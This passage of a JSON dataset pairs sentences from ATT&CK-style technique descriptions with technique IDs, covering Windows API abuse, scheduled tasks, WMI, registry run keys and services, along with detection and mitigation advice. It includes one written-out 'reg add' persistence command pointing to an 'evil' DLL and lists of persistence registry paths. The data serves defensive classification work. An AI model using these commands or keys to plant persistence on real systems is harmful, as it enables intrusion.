    "text": "Lazarus Group has used the Windows API ObtainUserAgentString to obtain the User-Agent from a compromised host to connect to a C2 server.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Lazarus Group has also used various, often lesser known, functions to perform various types of Discovery and Process Injection.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "PipeMon's first stage has been executed by a call to CreateProcess with the decryption password in an argument.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "PipeMon has used a call to LoadLibrary to load its installer.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Ramsay can use Windows API functions such as WriteFile, CloseHandle, and GetCurrentHwProfile during its collection and file storage operations.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Ramsay can execute its embedded components via CreateProcessA and ShellExecute.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "TrickBot uses the Windows API call, CreateProcessW(), to manage execution flow.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "TrickBot has also used Nt* API functions to perform Process Injection.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office VBA macros from calling Win32 APIs.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Identify and block potentially malicious software executed that may be executed through this technique by using application control tools, like Windows Defender Application Control, AppLocker, or Software Restriction Policies where appropriate.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Utilization of the Windows APIs may involve processes loading/accessing system DLLs associated with providing called functions (ex: ntdll.dll, kernel32.dll, advapi32.dll, user32.dll, and gdi32.dll).",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Monitoring for DLL loads, especially to abnormal/unusual or potentially malicious processes, may indicate abuse of the Windows API.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Though noisy, this data can be combined with other indicators to identify adversary activity.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Monitoring API calls may generate a significant amount of data and may not be useful for defense unless collected under specific circumstances, since benign use of API functions are common and may be difficult to distinguish from malicious behavior.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Correlation of activity by process lineage by process ID may be sufficient.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The associated Registry key is located at HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The setting can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Configure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "This can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Increase scheduling priority.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "There are multiple ways to access the Task Scheduler in Windows.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The deprecated at utility could also be abused by adversaries (ex: At), though at.exe can not access tasks created with schtasks or the Control Panel.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM).",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "APT29 used scheduler and schtasks to create new tasks on remote hosts as part of lateral movement.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "They have manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "APT29 also created a scheduled task to maintain SUNSPOT persistence when the host booted during the 2020 SolarWinds intrusion.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "They previously used named and hijacked scheduled tasks to also establish persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Monitor executed commands and arguments for actions that could be taken to gather tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles,",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for newly constructed processes and/or command-lines that execute from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for newly constructed scheduled jobs by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Several events will then be logged on scheduled task activity, including: Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered; Event ID 4698 on Windows 10, Server 2016 - Scheduled task created;Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled;Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Shamoon creates a new service named \"ntssrv\" to execute the payload.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "This activity may also be seen shortly after Internal Spearphishing.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This includes compression applications, such as those for zip files, that can be used to Deobfuscate/Decode Files or Information in payloads.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "For example, TA505 makes their malware look like legitimate Microsoft Word documents, .pdf and/or .lnk files.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "An adversary may rely upon a user opening a malicious file in order to gain execution.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Users may be subjected to social engineering to get them to open a file that will lead to code execution.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This user action will typically be observed as follow-on behavior from Spearphishing Attachment.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "While Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "TA505 has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "On Windows 10, various Attack Surface Reduction (ASR) rules can be enabled to prevent the execution of potentially malicious executable files (such as those that have been downloaded and executed by Office applications/scripting interpreters/email clients or that do not meet specific prevalence, age, or trusted list criteria).",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Note: cloud-delivered protection must be enabled for certain rules.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Application control may be able to prevent the running of executables masquerading as other files.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for newly constructed files that are downloaded and executed on the user's computer.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for newly constructed processes and/or command-lines for applications that may be used by an adversary to gain initial access that require user interaction.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "WMI is an administration feature that provides a uniform environment to access Windows system components.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model (DCOM) and Windows Remote Management (WinRM).",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "They have also used WMI for the remote execution of files for lateral movement.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "FIN8's malicious spearphishing payloads use WMI to launch malware and spawn cmd.exe execution.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "FIN8 has also used WMIC for lateral movement as well as during and post compromise cleanup activities.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Sibot has used WMI to discover network connections and configurations.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Sibot has also used the Win32_Process class to execute a malicious DLL.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "On Windows 10, enable Attack Surface Reduction (ASR) rules to block processes created by WMI commands from running.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Note: many legitimate tools and applications utilize WMI for command execution.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Use application control configured to block execution of wmic.exe if it is not required for a given system or network to prevent potential misuse by adversaries.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "For example, in Windows 10 and Windows Server 2016 and above, Windows Defender Application Control (WDAC) policy rules may be applied to block the wmic.exe application and to prevent abuse.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Prevent credential overlap across systems of administrator and privileged accounts.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "By default, only administrators are allowed to connect remotely using WMI.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Monitor executed commands and arguments for actions that are used to perform remote behavior",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for newly constructed processes and/or command-lines of \"wmic\"",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "These programs will be executed under the context of the user and will have the account's associated permissions level.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Placing a program within a startup folder will also cause that program to execute when a user logs in.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The following run keys are created by default on Windows systems:",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Run keys may exist under multiple hives.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Registry run key entries can reference programs directly or list them as a dependency.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The following Registry keys can be used to set startup folder items for persistence:",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The following Registry keys can control automatic startup of services during boot:",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Most of these actions are under the control of the operating system, but you can also add custom actions here.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit and HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell subkeys can automatically launch programs.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Programs listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run when any user logs on.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "By default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries can add other programs or processes to this registry value which will automatically launch at boot.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "APT41 added a registry key in HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost to establish persistence for Cobalt Strike.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "If establishing persistence by installation as a new service fails, one variant of Elise establishes persistence for the created .exe file by setting the following Registry key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost : %APPDATA%\\Microsoft\\Network\\svchost.exe.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Other variants have set the following Registry keys for persistence: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\imejp : [self] and HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\IAStorD.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "HTTPBrowser has established persistence by setting the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key value for wdm to the path of the executable.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "It has also used the Registry entry HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run vpdn \"%ALLUSERPROFILE%\\%APPDATA%\\vpdn\\VPDN_LU.exe\" to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Patchwork has added the path of its second-stage malware to the startup folder to achieve persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "One of its file stealers has also persisted by adding a Registry Run key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "If this fails, it attempts to add Registry Run keys.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "S-Type may create a .lnk file to itself that is saved in the Start menu folder.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "It may also create the Registry key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ IMJPMIJ8.1{3 characters of Unique Identifier}.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "A Turla Javascript backdoor added a local_update_check value under the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Additionally, a Turla custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitor executed commands and arguments that may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitor the start folder for additions or changes.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including the startup folders.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for newly created windows registry keys that may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The SSP configuration is stored in two Registry keys: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages and HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Use auditing tools capable of detecting privilege and service abuse opportunities on systems within an enterprise and correct them.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent an application from writing a signed vulnerable driver to the system.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Enforce registration and execution of only legitimately signed service drivers where possible.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Ensure that Driver Signature Enforcement is enabled to restrict unsigned drivers from being installed.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for new service driver installations and loads (ex: Sysmon Event ID 6) that are not part of known software update/patch cycles.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "When Windows boots up, it starts programs or applications called services that perform background system functions.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may also use services to install and execute malicious drivers.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "For example, after dropping a driver file (ex: .sys) to disk, the payload can be loaded and registered via Native API functions such as CreateServiceW() (or manually via functions such as ZwLoadDriver() and ZwSetValueKey()), by creating the required service Registry values ( Modify Registry), or by using command-line utilities such as PnPUtil.exe.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may leverage these drivers as Rootkits to hide the presence of malicious activity on a system.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of Exploitation for Privilege Escalation.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may also directly start services through Service Execution.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "To make detection analysis more challenging, malicious services may also incorporate Masquerade Task or Service (ex: using a service and/or payload name related to a legitimate OS or benign software component).",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
